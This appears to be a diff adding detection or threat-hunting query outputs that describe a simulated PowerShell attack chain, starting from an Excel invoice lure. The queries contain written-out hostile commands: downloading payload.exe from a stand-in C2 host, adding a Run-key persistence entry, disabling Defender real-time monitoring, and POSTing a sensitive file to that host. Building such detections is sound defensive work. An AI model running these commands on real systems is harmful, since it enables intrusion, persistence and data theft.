@@ -1,0 +1,21 @@
+<output>
+Image: "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\OUTLOOK.EXE" AND relation: "Process Start"
+</output>
+<output>
+Image: "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\EXCEL.EXE" AND relation: "Process Start" AND dstNode.Name: "Invoice_2023.xlsx" AND dstNode.Type: "File"
+</output>
+<output>
+Image: "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" AND Cmdline: "-ExecutionPolicy Bypass -File C:\\\\Users\\\\User\\\\Downloads\\\\malicious_script.ps1" AND relation: "Process Start"
+</output>
+<output>
+Image: "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" AND Cmdline: "Invoke-WebRequest -Uri \\"http://malicious-c2-server.com/payload.exe\\" -OutFile \\"C:\\\\Users\\\\User\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\\"" AND relation: "Process Start" AND dstNode.Image: "C:\\\\Users\\\\User\\\\AppData\\\\Local\\\\Temp\\\\payload.exe" AND dstNode.Type: "Process"
+</output>
+<output>
+Image: "powershell.exe" AND Cmdline: "New-ItemProperty -Path \\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\" -Name \\"MaliciousApp\\" -Value \\"C:\\\\Users\\\\User\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\\" -PropertyType String" AND relation: "Process Start" AND dstNode.Key: "HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" AND dstNode.Type: "Registry"
+</output>
+<output>
+Image: "powershell.exe" AND Cmdline: "Set-MpPreference -DisableRealtimeMonitoring $true" AND relation: "Process Start"
+</output>
+<output>
+Image: "powershell.exe" AND Cmdline: "Invoke-WebRequest -Uri \\"http://malicious-c2-server.com/exfiltrate\\" -Method POST -Body (Get-Content \\"C:\\\\Users\\\\User\\\\Documents\\\\sensitive_data.txt\\")" AND relation: "Process Start" AND dstNode.Dstaddress: "malicious-c2-server.com" AND dstNode.Port: 80 AND dstNode.Type: "Network"
+</output>
